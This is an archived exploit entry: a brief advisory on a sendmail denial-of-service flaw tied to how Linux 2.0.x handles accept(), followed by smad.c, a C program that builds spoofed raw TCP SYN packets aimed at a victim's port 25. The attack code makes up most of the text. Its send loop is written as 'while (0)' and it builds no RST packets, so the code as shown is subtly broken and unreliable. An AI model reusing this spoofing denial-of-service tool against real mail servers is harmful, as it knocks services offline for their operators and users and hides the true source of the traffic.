/*
source: http://www.securityfocus.com/bid/363/info

The 2.0.x kernels have a quirk in the TCP implementation that have to do with the accept() call returning after only a syn has been recieved (as opposed to the three way handshake having been completed). Sendmail, which is compiled on many unices, makes the assumption that the three way handshake has been completed and a tcp connection has been fully established. This trust in a standard tcp implementation is seen in the following section of code <src/daemon.c>:
*/


t = accept(DaemonSocket,

(struct sockaddr *)&RealHostAddr, &lotherend);

if (t >= 0 || errno != EINTR)

break;

}

savederrno = errno;

(void) blocksignal(SIGALRM);

if (t < 0)

{ errno = savederrno;

syserr("getrequests: accept");

/* arrange to re-open the socket next time around */

(void) close(DaemonSocket);

DaemonSocket = -1;

refusingconnections = TRUE;

sleep(5);

continue;

}

It's possible to cause a denial of service here if a RST is sent after the initial SYN to the sendmail smtpd on port 25. If that were to be done, the sendmail smtpd would be caught in a loop (above) accepting, testing the socket [yes, the one which accept returned on listening on port 25], sleeping, and closing the socket for as long as the syns and following rsts are sent. It is also completely possible to do this with spoofed packets. 


/*

* smad.c - sendmail accept dos -

*

* Salvatore Sanfilippo [AntireZ]

* Intesis SECURITY LAB Phone: +39-2-671563.1

* Via Settembrini, 35 Fax: +39-2-66981953

* I-20124 Milano ITALY Email: antirez@seclab.com

* md5330@mclink.it

*

* compile it under Linux with gcc -Wall -o smad smad.c

*

* usage: smad fakeaddr victim [port]

*/

#include <unistd.h>

#include <string.h>

#include <stdio.h>

#include <stdlib.h>

#include <arpa/inet.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/tcp.h>

#include <netinet/ip.h>

#include <netinet/in.h>

#include <netdb.h>

#include <unistd.h>

#define SLEEP_UTIME 100000 /* modify it if necessary */

#define PACKETSIZE (sizeof(struct iphdr) + sizeof(struct tcphdr))

#define OFFSETTCP (sizeof(struct iphdr))

#define OFFSETIP (0)

u_short cksum(u_short *buf, int nwords)

{

unsigned long sum;

u_short *w = buf;

for (sum = 0; nwords > 0; nwords-=2)

sum += *w++;

sum = (sum >> 16) + (sum & 0xffff);

sum += (sum >> 16);

return ~sum;

}

void resolver (struct sockaddr * addr, char *hostname, u_short port)

{

struct sockaddr_in *address;

struct hostent *host;

address = (struct sockaddr_in *)addr;

(void) bzero((char *)address, sizeof(struct sockaddr_in));

address->sin_family = AF_INET;

address->sin_port = htons(port);

address->sin_addr.s_addr = inet_addr(hostname);

if ( (int)address->sin_addr.s_addr == -1) {

host = gethostbyname(hostname);

if (host) {

bcopy( host->h_addr,

(char *)&address->sin_addr,host->h_length);

} else {

perror("Could not resolve address");

exit(-1);

}


}

}

int main(int argc, char **argv)

{

char runchar[] = "|/-\\";

char packet[PACKETSIZE],

*fromhost,

*tohost;

u_short fromport = 3000,

toport = 25;

struct sockaddr_in local, remote;

struct iphdr *ip = (struct iphdr*) (packet + OFFSETIP);

struct tcphdr *tcp = (struct tcphdr*) (packet + OFFSETTCP);

struct tcp_pseudohdr

{

struct in_addr saddr;

struct in_addr daddr;

u_char zero;

u_char protocol;

u_short lenght;

struct tcphdr tcpheader;

}

pseudoheader;

int sock, result, runcharid = 0;

if (argc < 3)

{

printf("usage: %s fakeaddr victim [port]\n", argv[0]);

exit(0);

}

if (argc == 4)

toport = atoi(argv[3]);

bzero((void*)packet, PACKETSIZE);

fromhost = argv[1];

tohost = argv[2];

resolver((struct sockaddr*)&local, fromhost, fromport);

resolver((struct sockaddr*)&remote, tohost, toport);

sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

if (sock == -1) {

perror("can't get raw socket");

exit(1);

}

/* src addr */

bcopy((char*)&local.sin_addr, &ip->saddr,sizeof(ip->saddr));

/* dst addr */

bcopy((char*)&remote.sin_addr,&ip->daddr,sizeof(ip->daddr));

ip->version = 4;

ip->ihl = sizeof(struct iphdr)/4;

ip->tos = 0;

ip->tot_len = htons(PACKETSIZE);

ip->id = htons(getpid() & 255);

/* no flags */

ip->frag_off = 0;

ip->ttl = 64;

ip->protocol = 6;

ip->check = 0;

tcp->th_dport = htons(toport);

tcp->th_sport = htons(fromport);

tcp->th_seq = htonl(32089744);

tcp->th_ack = htonl(0);

tcp->th_off = sizeof(struct tcphdr)/4;

/* 6 bit reserved */

tcp->th_flags = TH_SYN;

tcp->th_win = htons(512);

/* start of pseudo header stuff */

bzero(&pseudoheader, 12+sizeof(struct tcphdr));

pseudoheader.saddr.s_addr=local.sin_addr.s_addr;

pseudoheader.daddr.s_addr=remote.sin_addr.s_addr;

pseudoheader.protocol = 6;

pseudoheader.lenght = htons(sizeof(struct tcphdr));

bcopy((char*) tcp, (char*) &pseudoheader.tcpheader,

sizeof(struct tcphdr));

/* end */

tcp->th_sum = cksum((u_short *) &pseudoheader,

12+sizeof(struct tcphdr));

/* 16 bit urg */

while (0)

{

result = sendto(sock, packet, PACKETSIZE, 0,

(struct sockaddr *)&remote, sizeof(remote));

if (result != PACKETSIZE)

{

perror("sending packet");

exit(0);

} printf("\b");

printf("%c", runchar[runcharid]);

fflush(stdout);

runcharid++;

if (runcharid == 4)

runcharid = 0;

usleep(SLEEP_UTIME);

}

return 0;

}